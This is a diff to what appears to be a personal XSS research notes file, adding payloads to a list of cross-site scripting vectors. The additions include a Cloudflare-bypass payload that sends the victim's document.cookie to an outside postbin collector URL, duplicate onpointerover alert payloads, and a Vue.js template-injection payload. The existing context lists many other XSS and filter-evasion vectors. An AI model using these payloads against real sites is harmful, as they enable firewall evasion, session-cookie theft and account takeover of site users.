@@ -1,6 +1,7 @@
 # XSS Research
 ### Cloudflare bypass:
 ```
+"><img src=x Onerror="top[8680439..toString(30)]fetch('https://www.toptal.com/developers/postbin/1640270413660-2793912843335?c='+(document.cookie)">
 1. Insert the following XSS payload into the user input fields and observe that the Cloudflare doesn't block the request goint to the server.
 	Paylaod: "><img src=x Onerror="top[8680439..toString(30)](document.cookie)">
 	Modified payload: "><img src=x Onload="top[8680439..toString(30)](eval(alert(1)))"> - it worked for me
@@ -44,6 +45,8 @@ xss.xml:
 <IMG SRC=javascript:alert(&quot;XSS&quot;)>
 <IMG SRC=javascript:alert(ëXSSí)>      
 <img src=xss onerror=alert(1)>
+<div onpointerover="alert(45)">MOVE HERE</div>
+<div onpointerover="alert(45)">MOVE HERE</div>
 
 <iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
 
@@ -659,4 +662,12 @@ javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
 <IMG SRC=x ondurationchange="alert(String.fromCharCode(88,83,83))">
 <IMG SRC=x onemptied="alert(String.fromCharCode(88,83,83))">
 <IMG SRC=x onended="alert(String.fromCharCode(88,83,83))">
+```
+### Vue js payloads
+```
+{{constructor.constructor('alert(1)')()}}
+```
+### Web mail
+```
+subject=xss payload
 ```
